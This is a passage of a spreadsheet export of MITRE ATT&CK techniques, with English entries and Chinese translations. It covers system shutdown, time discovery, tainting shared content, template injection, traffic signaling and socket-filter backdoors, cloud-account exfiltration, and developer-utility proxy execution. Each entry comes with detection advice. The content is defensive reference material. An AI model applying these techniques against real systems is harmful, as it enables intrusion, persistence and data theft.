组件和系统实用程序访问服务控制管理器例如 <code>sc.exe</code> 和 [Net](https://attack.mitre.org/software/S0039)。 [PsExec](https://attack.mitre.org/software/S0029) 还可用于通过通过服务控制管理器 API 创建的临时 Windows 服务执行命令或有效负载。（引用：Russinovich Sysinternals）诸如 [ PsExec](https://attack.mitre.org/software/S0029) 和 <code>sc.exe</code> 可以接受远程服务器作为参数，并可用于进行远程执行。攻击者可能会利用这些机制来执行恶意内容。这可以通过执行新的或修改的服务来完成。该技术是在服务持久化或权限提升期间与 [Windows Service](https://attack.mitre.org/techniques/T1543/003) 结合使用的执行。
T1529,System Shutdown/Reboot,"Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of a machine or network device. In some cases, these commands may also be used to initiate a shutdown/reboot of a remote computer or network device via [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) (e.g. <code>reload</code>).(Citation: Microsoft Shutdown Oct 2017)(Citation: alert_TA18_106A) Shutting down or rebooting systems may disrupt access to computer resources for legitimate users.

Adversaries may attempt to shutdown/reboot a system after impacting it in other ways, such as [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) or [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490), to hasten the intended effects on system availability.(Citation: Talos Nyetya June 2017)(Citation: Talos Olympic Destroyer 2018)",https://attack.mitre.org/techniques/T1529,04 October 2019,20 October 2022,1.2,Impact,"Use process monitoring to monitor the execution and command line parameters of binaries involved in shutting down or rebooting systems. Windows event logs may also designate activity associated with a shutdown/reboot, ex. Event ID 1074 and 6006. Unexpected or unauthorized commands from network cli on network devices may also be associated with shutdown/reboot, e.g. the <code>reload</code> command.","Linux, Network, Windows, macOS","Command: Command Execution, Process: Process Creation, Sensor Health: Host Status",False,,,"Austin Clark, @c2defense",,,,,Availability,,"(Citation: Trend Micro KillDisk 2),(Citation: Proofpoint LookBack Malware Aug 2019),(Citation: Cisco Ukraine Wipers January 2022),(Citation: McAfee Shamoon December 2018),(Citation: Qualys Hermetic Wiper March 2022),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: US-CERT SHARPKNOT June 2018),(Citation: Sophos Maze VM September 2020),(Citation: Talos Olympic Destroyer 2018),(Citation: Unit 42 Shamoon3 2018),(Citation: Wired Lockergoga 2019),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: FireEye APT38 Oct 2018),(Citation: Talos Group123),(Citation: SentinelOne Hermetic Wiper February 2022),(Citation: Talos Nyetya June 2017),",系统关机/重启,攻击者可能会关闭/重新启动系统以中断对这些系统的访问或帮助破坏这些系统。操作系统可能包含启动机器或网络设备关机/重启的命令。在某些情况下，这些命令还可用于通过 [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) 启动远程计算机或网络设备的关机/重启（例如 <code >reload</code>）。（引用：Microsoft Shutdown Oct 2017）（引用：alert_TA18_106A）关闭或重新启动系统可能会中断合法用户对计算机资源的访问。攻击者可能会在以其他方式影响系统后尝试关闭/重启系统，例如 [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) 或 [Inhibit System Recovery](https:// /attack.mitre.org/techniques/T1490），以加快对系统可用性的预期效果。（引用：Talos Nyetya June 2017）（引用：Talos Olympic Destroyer 2018）
T1124,System Time Discovery,"An adversary may gather the system time and/or time zone from a local or remote system. The system time is set and stored by the Windows Time Service within a domain to maintain time synchronization between systems and services in an enterprise network. (Citation: MSDN System Time) (Citation: Technet Windows Time Service)

System time information may be gathered in a number of ways, such as with [Net](https://attack.mitre.org/software/S0039) on Windows by performing <code>net time \\hostname</code> to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using <code>w32tm /tz</code>. (Citation: Technet Windows Time Service)

This information could be useful for performing other techniques, such as executing a file with a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053) (Citation: RSA EU12 They're Inside), or to discover locality information based on time zone to assist in victim targeting (i.e. [System Location Discovery](https://attack.mitre.org/techniques/T1614)). Adversaries may also use knowledge of system time as part of a time bomb, or delaying execution until a specified date/time.(Citation: AnyRun TimeBomb)",https://attack.mitre.org/techniques/T1124,31 May 2017,22 April 2021,1.2,Discovery,Command-line interface monitoring may be useful to detect instances of net.exe or other command-line utilities being used to gather system time or time zone. Methods of detecting API use for gathering this information are likely less useful due to how often they may be used by legitimate software.,Windows,"Command: Command Execution, Process: OS API Execution, Process: Process Creation",False,,,FIRST.ORG's Cyber Threat Intelligence SIG,User,,,CAPEC-295,,,"(Citation: Proofpoint Azorult July 2018),(Citation: Cylance Shaheen Nov 2018),(Citation: FoxIT Wocao December 2019),(Citation: ESET RTM Feb 2017),(Citation: Trend Micro Tick November 2019),(Citation: Cofense Astaroth Sept 2018),(Citation: ESET Zebrocy Nov 2018),(Citation: Kaspersky QakBot September 2021),(Citation: Malwarebytes Kimsuky June 2021),(Citation: Cybereason Bazar July 2020),(Citation: Medium Metamorfo Apr 2020),(Citation: Palo Alto T9000 Feb 2016),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: Trend Micro DRBControl February 2020),(Citation: Kaspersky TajMahal April 2019),(Citation: BlackBerry CostaRicto November 2020),(Citation: Unit42 BendyBear Feb 2021),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: Prevailion DarkWatchman 2021),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: Unit 42 OilRig Sept 2018),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Unit 42 NOKKI Sept 2018),(Citation: Zscaler Higaisa 2020),(Citation: ESET PipeMon May 2020),(Citation: Cybereason StrifeWater Feb 2022),(Citation: Unit 42 Shamoon3 2018),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021),(Citation: FireEye SUNSHUTTLE Mar 2021),(Citation: McAfee Lazarus Nov 2020),(Citation: objective-see windtail1 dec 2018),(Citation: DigiTrust Agent Tesla Jan 2017),(Citation: ESET Okrum July 2019),(Citation: McAfee GhostSecret),(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021),(Citation: SecureList Griffon May 2019),(Citation: GovCERT Carbon May 2016),(Citation: ESET Grandoreiro April 2020),(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE MAY 2020),(Citation: Cyphort EvilBunny Dec 2014),(Citation: US-CERT HOPLIGHT Apr 2019),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: CISA ComRAT Oct 2020),(Citation: Kaspersky CactusPete Aug 2020),(Citation: Lastline DarkHotel Just In Time Decryption Nov 2015),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: NCC Group Team9 June 2020),(Citation: Unit42 Azorult Nov 2018),(Citation: ATT Sidewinder January 2021),(Citation: Kaspersky ShadowPad Aug 2017),(Citation: Kaspersky Turla),(Citation: Unit42 Cannon Nov 2018),(Citation: ESET InvisiMole June 2020),(Citation: ESET InvisiMole June 2018),(Citation: Palo Alto MoonWind March 2017),(Citation: Talos GravityRAT),(Citation: Kaspersky StoneDrill 2017),(Citation: SANS Conficker),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Symantec W.32 Stuxnet Dossier),(Citation: JoeSecurity Egregor 2020),(Citation: Volexity PowerDuke November 2016),(Citation: Objective See Green Lambert for OSX Oct 2021),(Citation: Palo Alto Shamoon Nov 2016),(Citation: TrendMicro POWERSTATS V3 June 2019),(Citation: GDATA Zeus Panda June 2017),(Citation: FireEye APT10 Sept 2018),(Citation: ClearSky Lazarus Aug 2020),(Citation: CISA AR21-126A FIVEHANDS May 2021),(Citation: NCC Group Chimera January 2021),(Citation: ESET GreyEnergy Oct 2018),(Citation: CISA Zebrocy Oct 2020),(Citation: Trend Micro Conficker),(Citation: TechNet Net Time),",系统时间发现,攻击者可以从本地或远程系统收集系统时间和/或时区。系统时间由域内的 Windows 时间服务设置和存储，以保持企业网络中系统和服务之间的时间同步。 （引用：MSDN 系统时间）（引用：Technet Windows 时间服务）系统时间信息可以通过多种方式收集，例如在 Windows 上使用 [Net](https://attack.mitre.org/software/S0039)通过执行 <code>net time \\hostname</code> 来收集远程系统上的系统时间。受害者的时区也可以从当前系统时间推断或使用 <code>w32tm /tz</code> 收集。 （引用：Technet Windows 时间服务）此信息可能对执行其他技术很有用，例如使用 [计划任务/作业]（https://attack.mitre.org/techniques/T1053）执行文件（引用：RSA EU12 他们在里面），或者根据时区发现位置信息以帮助定位受害者（即[系统位置发现]（https://attack.mitre.org/techniques/T1614））。攻击者也可能将系统时间知识用作定时炸弹的一部分，或将执行延迟到指定的日期/时间。（引用：AnyRun TimeBomb）
T1080,Taint Shared Content,"
Adversaries may deliver payloads to remote systems by adding content to shared storage locations, such as network drives or internal code repositories. Content stored on network drives or in other shared locations may be tainted by adding malicious programs, scripts, or exploit code to otherwise valid files. Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary's code on a remote system. Adversaries may use tainted shared content to move laterally.

A directory share pivot is a variation on this technique that uses several other techniques to propagate malware when users access a shared network directory. It uses [Shortcut Modification](https://attack.mitre.org/techniques/T1547/009) of directory .LNK files that use [Masquerading](https://attack.mitre.org/techniques/T1036) to look like the real directories, which are hidden through [Hidden Files and Directories](https://attack.mitre.org/techniques/T1564/001). The malicious .LNK-based directories have an embedded command that executes the hidden malware file in the directory and then opens the real intended directory so that the user's expected action still occurs. When used with frequently used network directories, the technique may result in frequent reinfections and broad access to systems and potentially to new and higher privileged accounts. (Citation: Retwin Directory Share Pivot)

Adversaries may also compromise shared network directories through binary infections by appending or prepending its code to the healthy binary on the shared network directory. The malware may modify the original entry point (OEP) of the healthy binary to ensure that it is executed before the legitimate code. The infection could continue to spread via the newly infected file when it is executed by a remote system. These infections may target both binary and non-binary formats that end with extensions including, but not limited to, .EXE, .DLL, .SCR, .BAT, and/or .VBS.",https://attack.mitre.org/techniques/T1080,31 May 2017,17 October 2021,1.3,Lateral Movement,"Processes that write or overwrite many files to a network shared directory may be suspicious. Monitor processes that are executed from removable media for malicious or abnormal activity such as network connections due to Command and Control and possible network Discovery techniques.

Frequently scan shared network directories for malicious files, hidden files, .LNK files, and other file types that may not typical exist in directories used to share specific types of content.","Linux, Office 365, SaaS, Windows, macOS","File: File Creation, File: File Modification, Network Share: Network Share Access, Process: Process Creation",False,,,"David Routin; Michal Dida, ESET",User,,Access to shared folders and content with write permissions,CAPEC-562,,,"(Citation: CarbonBlack Conti July 2020),(Citation: Cisco H1N1 Part 2),(Citation: Symantec W.32 Stuxnet Dossier),(Citation: Softpedia MinerC),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: ESET InvisiMole June 2020),(Citation: ESET Gamaredon June 2020),(Citation: TrendMicro Ursnif Mar 2015),(Citation: TrendMicro Ursnif File Dec 2014),(Citation: Cybereason Conti Jan 2021),(Citation: Kaspersky Darkhotel),(Citation: Eset Ramsay May 2020),(Citation: NSA MS AppLocker),(Citation: TechNet Applocker vs SRP),(Citation: Windows Commands JPCERT),(Citation: Beechey 2010),(Citation: Corio 2008)",污染共享内容,攻击者可以通过将内容添加到共享存储位置（例如网络驱动器或内部代码存储库）来将有效负载传递到远程系统。存储在网络驱动器或其他共享位置的内容可能会因向其他有效文件添加恶意程序、脚本或漏洞代码而受到污染。一旦用户打开共享的受污染内容，就可以执行恶意部分以在远程系统上运行对手的代码。攻击者可能会使用受污染的共享内容横向移动。目录共享枢轴是这种技术的一种变体，当用户访问共享网络目录时，它使用其他几种技术来传播恶意软件。它使用 [Shortcut Modification](https://attack.mitre.org/techniques/T1547/009) 目录 .LNK 文件使用 [Masquerading](https://attack.mitre.org/techniques/T1036) 来查看就像真正的目录一样，通过[隐藏文件和目录]（https://attack.mitre.org/techniques/T1564/001）隐藏。基于 .LNK 的恶意目录有一个嵌入式命令，该命令执行目录中隐藏的恶意软件文件，然后打开真正的预期目录，以便用户的预期操作仍然发生。当与经常使用的网络目录一起使用时，该技术可能导致频繁的再感染和对系统的广泛访问，并可能导致新的和更高特权的帐户。 （引用：Retwin Directory Share Pivot）攻击者还可能通过二进制感染破坏共享网络目录，方法是将其代码附加或附加到共享网络目录上的健康二进制文件中。恶意软件可能会修改健康二进制文件的原始入口点 (OEP)，以确保它在合法代码之前执行。当远程系统执行新感染的文件时，感染可能会继续传播。这些感染可能针对以扩展名结尾的二进制和非二进制格式，包括但不限于 .EXE、.DLL、.SCR、.BAT 和/或 .VBS。
T1221,Template Injection,"Adversaries may create or modify references in user document templates to conceal malicious code or force authentication attempts. For example, Microsoft’s Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered.(Citation: Microsoft Open XML July 2017)

Properties within parts may reference shared public resources accessed via online URLs. For example, template properties may reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded.

Adversaries may abuse these templates to initially conceal malicious code to be executed via user documents. Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded.(Citation: SANS Brian Wiltse Template Injection) These documents can be delivered via other techniques such as [Phishing](https://attack.mitre.org/techniques/T1566) and/or [Taint Shared Content](https://attack.mitre.org/techniques/T1080) and may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched.(Citation: Redxorblue Remote Template Injection) Examples have been seen in the wild where template injection was used to load malicious code containing an exploit.(Citation: MalwareBytes Template Injection OCT 2017)

Adversaries may also modify the <code>*\template</code> control word within an .rtf file to similarly conceal then download malicious code. This legitimate control word value is intended to be a file destination of a template file resource that is retrieved and loaded when an .rtf file is opened. However, adversaries may alter the bytes of an existing .rtf file to insert a template control word field to include a URL resource of a malicious payload.(Citation: Proofpoint RTF Injection)(Citation: Ciberseguridad Decoding malicious RTF files)

This technique may also enable [Forced Authentication](https://attack.mitre.org/techniques/T1187) by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt.(Citation: Anomali Template Injection MAR 2018)(Citation: Talos Template Injection July 2017)(Citation: ryhanson phishery SEPT 2016)",https://attack.mitre.org/techniques/T1221,17 October 2018,12 January 2022,1.3,Defense Evasion,"Analyze process behavior to determine if user document applications (such as Office) are performing actions, such as opening network connections, reading files, spawning abnormal child processes (ex: [PowerShell](https://attack.mitre.org/techniques/T1059/001)), or other suspicious actions that could relate to post-compromise behavior.

Monitor .rtf files for strings indicating the <code>&#42;\template</code> control word has been modified to retrieve a URL resource, such as <code>&#42;\template http</code> or <code>&#42;\template \u-</code>.",Windows,"Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Process: Process Creation",False,,Static File Analysis,"Brian Wiltse @evalstrings; Michael Raggi @aRtAGGI; Patrick Campbell, @pjcampbe11",User,,,,,,"(Citation: Uptycs Confucius APT Jan 2021),(Citation: Unit 42 Gamaredon February 2022),(Citation: US-CERT TA18-074A),(Citation: Secureworks IRON TILDEN Profile),(Citation: ClearSky Lazarus Aug 2020),(Citation: CERT-EE Gamaredon January 2021),(Citation: Cybereason Chaes Nov 2020),(Citation: McAfee Lazarus Jul 2020),(Citation: Proofpoint RTF Injection),(Citation: Unit 42 Phishery Aug 2018),(Citation: ESET Gamaredon June 2020),(Citation: Unit42 Sofacy Dec 2018),(Citation: Unit 42 Inception November 2018),(Citation: Unit 42 Tropic Trooper Nov 2016),(Citation: TrendMicro Gamaredon April 2020),(Citation: Microsoft Actinium February 2022),(Citation: Talos Frankenstein June 2019),(Citation: Microsoft Disable Macros),(Citation: Anomali Template Injection MAR 2018)",模板注入,攻击者可能会在用户文档模板中创建或修改引用以隐藏恶意代码或强制进行身份验证尝试。例如，Microsoft 的 Office Open XML (OOXML) 规范为 Office 文档（.docx、xlsx、.pptx）定义了一种基于 XML 的格式，以替换旧的二进制格式（.doc、.xls、.ppt）。 OOXML 文件打包在一起 ZIP 档案，其中包含各种 XML 文件（称为部分），包含共同定义文档呈现方式的属性。（引用：Microsoft Open XML 2017 年 7 月）部分中的属性可能引用通过在线 URL 访问的共享公共资源.例如，模板属性可以引用一个文件，作为预先格式化的文档蓝图，在加载文档时获取该文件。攻击者可能会滥用这些模板来最初隐藏要通过用户文档执行的恶意代码。注入文档的模板引用可能会在加载文档时获取并执行恶意负载。（引用：SANS Brian Wiltse 模板注入）这些文档可以通过其他技术传递，例如 [网络钓鱼](https://attack. mitre.org/techniques/T1566) 和/或 [污染共享内容](https://attack.mitre.org/techniques/T1080) 并可能逃避静态检测，因为没有典型的指标（VBA 宏、脚本等）直到恶意负载被获取后才存在。（引用：Redxorblue 远程模板注入）在野外已经看到了模板注入用于加载包含漏洞利用的恶意代码的示例。（引用：MalwareBytes 模板注入 OCT 2017）攻击者也可能修改.rtf 文件中的 <code>*\template</code> 控制字类似地隐藏然后下载恶意代码。此合法控制字值旨在作为打开 .rtf 文件时检索和加载的模板文件资源的文件目标。但是，攻击者可能会更改现有 .rtf 文件的字节以插入模板控制字字段以包含恶意负载的 URL 资源。（引用：Proofpoint RTF 注入）（引用：Ciberseguridad 解码恶意 RTF 文件）此技术也可能通过注入 SMB/HTTPS（或其他凭据提示）URL 并触发身份验证尝试来启用 [强制身份验证]（https://attack.mitre.org/techniques/T1187）。（引文：异常模板注入 2018 年 3 月）（引文: Talos 模板注入 2017 年 7 月）（引用： ryhanson phishery SEPT 2016）
T1205,Traffic Signaling,"Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. [Port Knocking](https://attack.mitre.org/techniques/T1205/001)), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.

Adversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).

The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.

On network devices, adversaries may use crafted packets to enable [Network Device Authentication](https://attack.mitre.org/techniques/T1556/004) for standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.  Adversaries may use crafted packets to attempt to connect to one or more (open or closed) ports, but may also attempt to connect to a router interface, broadcast, and network address IP on the same port in order to achieve their goals and objectives.(Citation: Cisco Synful Knock Evolution)(Citation: Mandiant - Synful Knock)(Citation: Cisco Blog Legacy Device Attacks)  To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage [Patch System Image](https://attack.mitre.org/techniques/T1601/001) due to the monolithic nature of the architecture.

Adversaries may also use the Wake-on-LAN feature to turn on powered off systems. Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it. Once the system is powered on, it may become a target for lateral movement.(Citation: Bleeping Computer - Ryuk WoL)(Citation: AMD Magic Packet)",https://attack.mitre.org/techniques/T1205,18 April 2018,19 October 2022,2.4,"Command and Control, Defense Evasion, Persistence","Record network packets sent to and from the system, looking for extraneous packets that do not belong to established flows.

The Wake-on-LAN magic packet consists of 6 bytes of <code>FF</code> followed by sixteen repetitions of the target system's IEEE address. Seeing this string anywhere in a packet's payload may be indicative of a Wake-on-LAN attempt.(Citation: GitLab WakeOnLAN)","Linux, Network, Windows, macOS","Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Process: Process Creation",False,,Defensive network service scanning,"Josh Day, Gigamon; Tony Lee",,,,,,,"(Citation: Kaspersky Turla Penquin December 2014),(Citation: Chronicle Winnti for Linux May 2019),(Citation: Trend Micro Iron Tiger April 2021),(Citation: ESET Kobalos Jan 2021),(Citation: ESET Kobalos Feb 2021),(Citation: Leonardo Turla Penquin May 2020),(Citation: Chaos Stolen Backdoor),(Citation: Bleeping Computer - Ryuk WoL),(Citation: Umbreon Trend Micro),(Citation: Mandiant - Synful Knock),",流量信号/流量信令,攻击者可能会使用流量信号来隐藏开放端口或其他用于持久性或命令和控制的恶意功能。流量信号涉及使用必须发送到系统以触发特殊响应的魔术值或序列，例如打开关闭的端口或执行恶意任务。这可能采取在端口被打开之前发送一系列具有某些特征的数据包的形式，攻击者可以使用这些数据包进行命令和控制。通常这一系列数据包包括尝试连接到预定义的关闭端口序列（即 [Port Knocking](https://attack.mitre.org/techniques/T1205/001)），但可能涉及异常标志、特定字符串、或其他独特的特征。序列完成后，打开端口可以通过基于主机的防火墙来完成，也可以通过定制软件来实现。攻击者也可能与已经打开的端口进行通信，但侦听该端口的服务只会响应命令或触发其他恶意功能，前提是传递了适当的魔法值。对触发通信的信号包的观察可以通过不同的方法进行。最初由 Cd00r（引用：Hartrell cd00r 2002）实现的一种方法是使用 libpcap 库来嗅探有问题的数据包。另一种方法利用原始套接字，这使恶意软件能够使用已经开放供其他程序使用的端口。在网络设备上，攻击者可能会使用精心制作的数据包为设备提供的标准服务（如 telnet）启用 [网络设备身份验证](https://attack.mitre.org/techniques/T1556/004)。此类信令还可用于打开关闭的服务端口（例如 telnet），或触发对设备上的恶意软件植入物的模块修改，添加、删除或更改恶意功能。攻击者可能会使用精心制作的数据包尝试连接到一个或多个（打开或关闭）端口，但也可能尝试连接到同一端口上的路由器接口、广播和网络地址 IP，以实现其目标。 （引用：Cisco Synful Knock Evolution）（引用：Mandiant - Synful Knock）（引用：Cisco Blog Legacy Device Attacks）要在嵌入式设备上启用此流量信号，攻击者必须首先实现并利用[补丁系统映像]（https:// attack.mitre.org/techniques/T1601/001）由于架构的整体性。攻击者也可能使用 Wake-on-LAN 功能来打开电源关闭的系统。 Wake-on-LAN 是一种硬件功能，它允许通过向其发送魔术数据包来打开或唤醒已断电的系统。一旦系统通电，它可能会成为横向移动的目标。（引用：Bleeping Computer - Ryuk WoL）（引用：AMD 魔术包）
T1205.001,Traffic Signaling: Port Knocking,"Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.

This technique has been observed both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.

The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.",https://attack.mitre.org/techniques/T1205/001,01 July 2020,11 March 2022,1.1,"Command and Control, Defense Evasion, Persistence","Record network packets sent to and from the system, looking for extraneous packets that do not belong to established flows.","Linux, Network, Windows, macOS","Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Flow",True,T1205,,,User,,,,,,"(Citation: Bitdefender StrongPity June 2020),",流量信号/流量信令：端口敲门,攻击者可能使用端口敲门来隐藏用于持久性或命令和控制的开放端口。为了启用一个端口，攻击者向预定义的关闭端口序列发送一系列尝试连接。序列完成后，打开端口通常由基于主机的防火墙完成，但也可以由定制软件实现。在动态打开监听端口以及启动与不同系统上的监听服务器的连接时，已经观察到这种技术。对触发通信的信号包的观察可以通过不同的方法进行。最初由 Cd00r（引用：Hartrell cd00r 2002）实现的一种方法是使用 libpcap 库来嗅探有问题的数据包。另一种方法利用原始套接字，这使恶意软件能够使用已经开放供其他程序使用的端口。
T1205.002,Traffic Signaling: Socket Filters,"Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the `libpcap` library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.

To establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria.(Citation: haking9 libpcap network sniffing) Adversaries have used these socket filters to trigger the installation of implants, conduct ping backs, and to invoke command shells. Communication with these socket filters may also be used in conjunction with [Protocol Tunneling](https://attack.mitre.org/techniques/T1572).(Citation: exatrack bpf filters passive backdoors)(Citation: Leonardo Turla Penquin May 2020)

Filters can be installed on any Unix-like platform with `libpcap` installed or on Windows hosts using `Winpcap`.  Adversaries may use either `libpcap` with `pcap_setfilter` or the standard library function `setsockopt` with `SO_ATTACH_FILTER` options. Since the socket connection is not active until the packet is received, this behavior may be difficult to detect due to the lack of activity on a host, low CPU overhead, and limited visibility into raw socket usage.",https://attack.mitre.org/techniques/T1205/002,30 September 2022,20 October 2022,1.0,"Command and Control, Defense Evasion, Persistence",Identify running processes with raw sockets. Ensure processes listed have a need for an open raw socket and are in accordance with enterprise policy.(Citation: crowdstrike bpf socket filters),"Linux, Windows, macOS","Network Traffic: Network Connection Creation, Process: Process Creation",True,T1205,,CrowdStrike; Tim (Wadhwa-)Brown,,,,,,,"(Citation: Leonardo Turla Penquin May 2020),",流量信号/流量信令：套接字过滤器,攻击者可能会将过滤器附加到网络套接字以进行监视，然后激活用于持久性或命令和控制的后门。通过提升权限，攻击者可以使用诸如“libpcap”库之类的功能来打开套接字并安装过滤器以允许或禁止某些类型的数据通过套接字。过滤器可能适用于通过指定网络接口（或每个接口，如果未指定）的所有流量。当网络接口接收到与过滤条件匹配的数据包时，可以在主机上触发其他操作，例如激活反向 shell。为了建立连接，攻击者向目标主机发送与安装的过滤条件匹配的精心制作的数据包。（引用：haking9 libpcap 网络嗅探）攻击者使用这些套接字过滤器来触发植入程序的安装、执行 ping 返回并调用命令外壳。与这些套接字过滤器的通信也可以与 [Protocol Tunneling]（https://attack.mitre.org/techniques/T1572）结合使用。（引用：exatrack bpf 过滤被动后门）（引用：Leonardo Turla Penquin 2020 年 5 月）过滤器可以安装在任何安装了`libpcap`的类Unix平台或使用`Winpcap`的Windows主机上。攻击者可以使用带有“pcap_setfilter”的“libpcap”或带有“SO_ATTACH_FILTER”选项的标准库函数“setsockopt”。由于在接收到数据包之前套接字连接是不活动的，因此由于主机上缺乏活动、低 CPU 开销以及对原始套接字使用情况的可见性有限，这种行为可能难以检测到。
T1537,Transfer Data to Cloud Account,"Adversaries may exfiltrate data by transferring the data, including backups of cloud environments, to another cloud account they control on the same service to avoid typical file transfers/downloads and network-based exfiltration detection.

A defender who is monitoring for large transfers to outside the cloud environment through normal file transfers or over command and control channels may not be watching for data transfers to another account within the same cloud provider. Such transfers may utilize existing cloud provider APIs and the internal address space of the cloud provider to blend into normal traffic or avoid data transfers over external network interfaces.

Incidents have been observed where adversaries have created backups of cloud instances and transferred them to separate accounts.(Citation: DOJ GRU Indictment Jul 2018) ",https://attack.mitre.org/techniques/T1537,30 August 2019,16 June 2022,1.3,Exfiltration,"Monitor account activity for attempts to share data, snapshots, or backups with untrusted or unusual accounts on the same cloud service provider. Monitor for anomalous file transfer activity between accounts and to untrusted VPCs. 

In AWS, sharing an Elastic Block Store (EBS) snapshot, either with specified users or publicly, generates a ModifySnapshotAttribute event in CloudTrail logs.(Citation: AWS EBS Snapshot Sharing) Similarly, in Azure, creating a Shared Access Signature (SAS) URI for a Virtual Hard Disk (VHS) snapshot generates a ""Get Snapshot SAS URL"" event in Activity Logs.(Citation: Azure Blob Snapshots)(Citation: Azure Shared Access Signature)",IaaS,"Cloud Storage: Cloud Storage Creation, Cloud Storage: Cloud Storage Metadata, Cloud Storage: Cloud Storage Modification, Network Traffic: Network Traffic Content, Snapshot: Snapshot Creation, Snapshot: Snapshot Metadata, Snapshot: Snapshot Modification",False,,,"Darin Smith, Cisco; ExtraHop; Praetorian",,,,,,,",",将数据传输到云帐户,攻击者可能会通过将数据（包括云环境的备份）传输到他们在同一服务上控制的另一个云帐户来泄露数据，以避免典型的文件传输/下载和基于网络的泄露检测。通过正常文件传输或通过命令和控制通道监视到云环境外部的大量传输的防御者可能不会监视到同一云提供商内的另一个帐户的数据传输。这种传输可以利用现有的云提供商 API 和云提供商的内部地址空间来融入正常流量或避免通过外部网络接口传输数据。已经观察到攻击者创建云实例备份并将其转移到不同账户的事件。（引文：DOJ GRU 起诉书 2018 年 7 月）
T1127,Trusted Developer Utilities Proxy Execution,"Adversaries may take advantage of trusted developer utilities to proxy execution of malicious payloads. There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering.(Citation: engima0x3 DNX Bypass)(Citation: engima0x3 RCSI Bypass)(Citation: Exploit Monday WinDbg)(Citation: LOLBAS Tracker) These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application control solutions.",https://attack.mitre.org/techniques/T1127,31 May 2017,05 May 2022,1.2,Defense Evasion,"Monitor for abnormal presence of these or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.

